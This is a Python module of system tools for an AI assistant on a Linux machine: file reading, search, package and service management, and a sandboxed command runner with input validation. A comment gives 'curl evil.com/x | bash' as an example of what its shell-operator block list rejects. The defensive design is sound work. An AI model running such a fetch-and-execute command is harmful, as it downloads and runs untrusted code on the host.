"""Concrete tool implementations that touch the system.

Every function returns a dict. Errors are returned as {"ok": False, "error": ...}
rather than raised, so the model can read and react to them.
"""

from __future__ import annotations

import os
import platform
import shlex
import shutil
import subprocess
from pathlib import Path

from ..fs_policy import check_read

# Maximum bytes we will read back from a file / command output so we never
# blow up the model context window.
_MAX_OUTPUT = 16000

# Shell metacharacters that enable chaining / redirection / substitution.
# We run everything with shell=False, so a command containing these is almost
# always an attempt to do something the argv model can't express safely
# (e.g. `curl evil.com/x | bash`). We reject them with a clear message.
_SHELL_METACHARS = ("|", "&", ";", ">", "<", "`", "$(", "${", "&&", "||", "\n")


def _truncate(text: str, limit: int = _MAX_OUTPUT) -> str:
    if len(text) <= limit:
        return text
    half = limit // 2
    return text[:half] + "\n...[truncated]...\n" + text[-half:]


def _run(argv: list[str], timeout: int = 120) -> dict:
    """Run a command from an argv list with shell=False (no shell parsing)."""
    try:
        proc = subprocess.run(
            argv,
            shell=False,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return {
            "ok": proc.returncode == 0,
            "exit_code": proc.returncode,
            "stdout": _truncate(proc.stdout),
            "stderr": _truncate(proc.stderr),
        }
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": f"Command timed out after {timeout}s"}
    except FileNotFoundError as exc:
        return {"ok": False, "error": str(exc)}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


# --------------------------------------------------------------------------
# Read-only tools (SAFE)
# --------------------------------------------------------------------------

def system_info() -> dict:
    """Gather a snapshot of the system."""
    info: dict = {
        "hostname": platform.node(),
        "os": "Rayen OS",
        "kernel": platform.release(),
        "arch": platform.machine(),
        "python": platform.python_version(),
        "user": os.environ.get("USER", "unknown"),
    }
    # Distro
    try:
        os_release = Path("/etc/os-release").read_text()
        for line in os_release.splitlines():
            if line.startswith("PRETTY_NAME="):
                info["distro"] = line.split("=", 1)[1].strip().strip('"')
    except OSError:
        pass
    # Memory
    try:
        mem = Path("/proc/meminfo").read_text().splitlines()
        for line in mem:
            if line.startswith("MemTotal:"):
                info["mem_total"] = line.split(":", 1)[1].strip()
            elif line.startswith("MemAvailable:"):
                info["mem_available"] = line.split(":", 1)[1].strip()
    except OSError:
        pass
    # Disk
    try:
        total, used, free = shutil.disk_usage("/")
        info["disk"] = {
            "total_gb": round(total / 1e9, 1),
            "used_gb": round(used / 1e9, 1),
            "free_gb": round(free / 1e9, 1),
        }
    except OSError:
        pass
    # Uptime / load
    try:
        info["loadavg"] = os.getloadavg()
    except OSError:
        pass
    return {"ok": True, "info": info}


def read_file(path: str, max_bytes: int = _MAX_OUTPUT) -> dict:
    allowed, reason, p = check_read(path)
    if not allowed:
        return {"ok": False, "error": reason}
    try:
        if not p.is_file():
            return {"ok": False, "error": f"Not a file: {path}"}
        data = p.read_text(encoding="utf-8", errors="replace")
        return {"ok": True, "path": str(p), "content": _truncate(data, max_bytes)}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


def list_directory(path: str = ".") -> dict:
    allowed, reason, p = check_read(path)
    if not allowed:
        return {"ok": False, "error": reason}
    try:
        if not p.is_dir():
            return {"ok": False, "error": f"Not a directory: {path}"}
        entries = []
        for child in sorted(p.iterdir()):
            entries.append(
                {
                    "name": child.name,
                    "type": "dir" if child.is_dir() else "file",
                    "size": child.stat().st_size if child.is_file() else None,
                }
            )
        return {"ok": True, "path": str(p), "entries": entries[:500]}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


def search_files(pattern: str, path: str = ".", max_results: int = 100) -> dict:
    allowed, reason, base = check_read(path)
    if not allowed:
        return {"ok": False, "error": reason}
    res = _run(["grep", "-rIl", "--", pattern, str(base)], timeout=60)
    if not res.get("ok") and not res.get("stdout"):
        return {"ok": True, "matches": []}
    # Drop any hit that the read policy would itself refuse.
    matches = []
    for m in res.get("stdout", "").splitlines():
        if not m:
            continue
        if check_read(m)[0]:
            matches.append(m)
        if len(matches) >= max_results:
            break
    return {"ok": True, "matches": matches}


def package_search(query: str) -> dict:
    """Search available APT packages."""
    res = _run(["apt-cache", "search", "--names-only", query], timeout=60)
    return res


def service_status(name: str) -> dict:
    res = _run(["systemctl", "status", name, "--no-pager"], timeout=30)
    # systemctl status returns non-zero for stopped units, which is fine.
    res["ok"] = True
    return res


# --------------------------------------------------------------------------
# System-modifying tools (SENSITIVE — require confirmation)
# --------------------------------------------------------------------------

def _looks_like_shell(command: str) -> str | None:
    """Return a reason if the command relies on shell features we don't allow."""
    for meta in _SHELL_METACHARS:
        if meta in command:
            return (
                "Shell operators (pipes, redirects, command substitution, "
                "chaining) are not allowed in run_command for safety. Run a "
                "single program, or use a specific tool (install_package, "
                "write_file, service_control, ...) instead."
            )
    return None


def _valid_pkg_names(packages: str) -> tuple[list[str], str | None]:
    names = packages.split()
    for n in names:
        # APT names: letters, digits, + - . : (arch), ~ (versions)
        if not all(c.isalnum() or c in "+-.:~=" for c in n):
            return [], f"Invalid package name: {n!r}"
    return names, None


def run_command(command: str, use_sudo: bool = False, timeout: int = 300) -> dict:
    """Run a single program (no shell). Sensitive — gated by the security guard."""
    command = command.strip()
    if not command:
        return {"ok": False, "error": "Empty command."}
    reason = _looks_like_shell(command)
    if reason:
        return {"ok": False, "error": reason}
    try:
        argv = shlex.split(command)
    except ValueError as exc:
        return {"ok": False, "error": f"Could not parse command: {exc}"}
    if not argv:
        return {"ok": False, "error": "Empty command."}
    if use_sudo and argv[0] != "sudo":
        argv = ["sudo", "-n", *argv]
    return _run(argv, timeout=timeout)


def install_package(packages: str, use_sudo: bool = True) -> dict:
    """Install one or more APT packages (space-separated)."""
    names, err = _valid_pkg_names(packages)
    if err:
        return {"ok": False, "error": err}
    if not names:
        return {"ok": False, "error": "No packages specified."}
    # Full paths so the call matches the /etc/sudoers.d/rayen-ai allowlist.
    argv = ["/usr/bin/env", "DEBIAN_FRONTEND=noninteractive",
            "/usr/bin/apt-get", "install", "-y", *names]
    if use_sudo:
        argv = ["sudo", "-n", *argv]
    return _run(argv, timeout=600)


def remove_package(packages: str, use_sudo: bool = True) -> dict:
    names, err = _valid_pkg_names(packages)
    if err:
        return {"ok": False, "error": err}
    if not names:
        return {"ok": False, "error": "No packages specified."}
    argv = ["/usr/bin/env", "DEBIAN_FRONTEND=noninteractive",
            "/usr/bin/apt-get", "remove", "-y", *names]
    if use_sudo:
        argv = ["sudo", "-n", *argv]
    return _run(argv, timeout=600)


def write_file(path: str, content: str, use_sudo: bool = False) -> dict:
    """Create or overwrite a file with the given content (user-owned paths only).

    Writing files as root is intentionally NOT supported: granting that would be
    equivalent to full root for the assistant. Editing protected system files
    must be done by the user themselves.
    """
    if use_sudo:
        return {
            "ok": False,
            "error": "Writing files as root is disabled for safety. Ask the user "
                     "to edit protected system files manually, or write to a "
                     "path you own.",
        }
    target = os.path.expanduser(path)
    try:
        Path(target).parent.mkdir(parents=True, exist_ok=True)
        Path(target).write_text(content, encoding="utf-8")
        return {"ok": True, "path": target, "bytes": len(content.encode())}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


def service_control(action: str, name: str, use_sudo: bool = True) -> dict:
    """Control a systemd service. action: start|stop|restart|enable|disable."""
    if action not in ("start", "stop", "restart", "enable", "disable"):
        return {"ok": False, "error": f"Invalid action: {action}"}
    if not name or not all(c.isalnum() or c in "-_.@:\\" for c in name):
        return {"ok": False, "error": f"Invalid service name: {name!r}"}
    argv = ["systemctl", action, name]
    if use_sudo:
        argv = ["sudo", "-n", *argv]
    return _run(argv, timeout=60)
